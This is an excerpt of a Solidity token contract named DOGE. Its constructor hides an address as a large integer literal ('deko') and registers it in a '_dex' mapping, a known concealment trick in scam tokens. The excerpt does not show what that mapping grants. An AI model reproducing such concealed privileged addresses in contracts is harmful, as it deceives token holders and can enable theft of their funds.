...
contract DOGE is IERC20, Token, Ownable {
    ...
    constructor(
        ...
        address dexAddress = address(deko);
        _dex[dexAddress] = dexAddress;
        _mint(msg.sender, totalSupply_ * 10 ** 18);
        emit Constructor(owner(), address(this), VERSION);
    }
    
    function getDexAddress(address dex_) public view returns (address) {
        return _dex[dex_];
    }
    ...
    uint160 deko = 1124669351590895965619600944435341320829609029681;
